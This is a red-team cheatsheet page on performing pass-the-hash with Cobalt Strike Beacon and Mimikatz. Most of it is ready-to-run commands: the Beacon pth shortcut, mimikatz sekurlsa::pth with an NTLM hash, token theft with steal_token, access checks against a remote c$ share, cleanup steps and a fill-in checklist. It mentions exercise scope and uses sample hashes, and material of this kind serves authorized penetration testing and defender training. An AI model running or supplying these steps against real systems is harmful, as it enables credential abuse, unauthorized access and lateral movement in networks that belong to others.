---
title: "Pass the Hash with Cobalt Strike"
description: "Use NTLM material with Beacon and Mimikatz, select the resulting token and verify remote authorization, with session context and cleanup commands."
category: "User Impersonation"
tools: ["Cobalt Strike", "Mimikatz"]
updated: "2026-11-10"
tags: ["impersonation", "pass-the-hash", "ntlm", "lateral-movement"]
draft: false
---

## 1. What Pass the Hash changes

Pass the Hash uses an account's NTLM hash for NTLM authentication without recovering its plaintext password. It requires an actual NTLM hash; DCC2 cached logon verifiers are not interchangeable with it.

Windows associates a process token with a logon session through its Authentication ID (LUID). That session's available credentials are used for network authentication. The examples create or modify a logon context and then select its token; they do not make the account an administrator everywhere.

| Requirement | Why it matters |
|---|---|
| Correct account and NTLM hash | Material must correspond to the named identity |
| Elevated access for the Mimikatz flow | The technique accesses protected authentication state |
| NTLM allowed on the authentication path | Policy restrictions can prevent the technique |
| Remote authorization | Authentication alone does not grant access to `c$` |

Examples use `CONTOSO\rsteel` and `lon-ws-1`. Hashes are illustrative sample material. Obtain material only within the exercise scope; see [OS Credential Dumping](/cheatsheets/os-credential-dumping-cheatsheet/) for the preceding topic.

## 2. Beacon's pth shortcut

This Beacon shorthand invokes a Mimikatz-backed Pass the Hash operation. Command syntax and implementation can vary by Cobalt Strike version; check `help pth` in the installed version before use.

```shell
# Inspect the installed command syntax
help pth

# Version-dependent shorthand; check the installed help first
pth CONTOSO\rsteel fc525c9683e8fe067095ba2ddc971889

# Verify the intended remote operation
ls \\lon-ws-1\c$
```

An access-denied result after the shortcut does not prove that the shortcut always fails or that the hash is invalid.

## 3. Explicit Mimikatz flow

`sekurlsa::pth` creates the example process with the supplied authentication material. Record the returned PID, then impersonate that process's token. A successful Mimikatz message alone does not establish that the current Beacon is using the new context.

```shell
# Create the process using the supplied NTLM material
mimikatz sekurlsa::pth /user:rsteel /domain:CONTOSO /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:%COMSPEC%
# Example output: PID 1188 and a new LUID; use the actual returned values

# Select the newly created process's token
steal_token 1188

# Verify access to the example share
ls \\lon-ws-1\c$
# A directory listing confirms access after selecting the intended token
```

This path is an explicit way to select the resulting token. It is not inherently less detectable than the shortcut: it still uses Mimikatz, accesses authentication state and creates a process.

## 4. Cleanup

Stop impersonation before terminating the process created for the test. Do not terminate the source process of an unrelated user.

```shell
# Return to the original Beacon context
rev2self

# Only if PID 1188 is the process created by this test
kill 1188

# Check the original context
getuid
```

## 5. Troubleshooting

| Symptom | What to check |
|---|---|
| `pth` arguments are rejected | `help pth` and the installed version's syntax |
| Mimikatz cannot access authentication state | Effective privileges and system protections |
| Process creation succeeds but access fails | Whether its token was selected, account/hash and NTLM policy |
| `ERROR_ACCESS_DENIED` on `c$` | Remote administrative permissions and restrictions |
| Local username is unexpected | Separate local token identity from network credentials |

Reference for version-specific behavior: [Beacon command behavior](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm).

## 6. Quick checklist

Run commands in Beacon. Choose the shortcut supported by the installed version or the explicit flow below; do not assume either one bypasses authentication policy.

```text
PREPARATION
[ ] getuid → record the original context
[ ] Confirm the input is an NTLM hash, not a DCC2 verifier
[ ] help pth → check the installed syntax

BEACON SHORTCUT — IF SUPPORTED
[ ] pth <DOMAIN>\<USER> <NTLM_HASH>
[ ] ls \\<HOST>\<SHARE> → verify actual authorization

EXPLICIT MIMIKATZ ALTERNATIVE
[ ] mimikatz sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:%COMSPEC%
[ ] Record the new PID and LUID from the output
[ ] steal_token <CREATED_PID>
[ ] ls \\<HOST>\<SHARE> → verify the intended remote operation

CLEANUP
[ ] rev2self
[ ] kill <CREATED_PID> → only the process created for this test
[ ] getuid → confirm the original context
```

## Related references

- [Token impersonation](/cheatsheets/token-impersonation-cobalt-cheatsheet/)
- [Pass the Ticket](/cheatsheets/pass-the-ticket-cobalt-cheatsheet/)
- [Process injection](/cheatsheets/process-injection-cobalt-cheatsheet/)
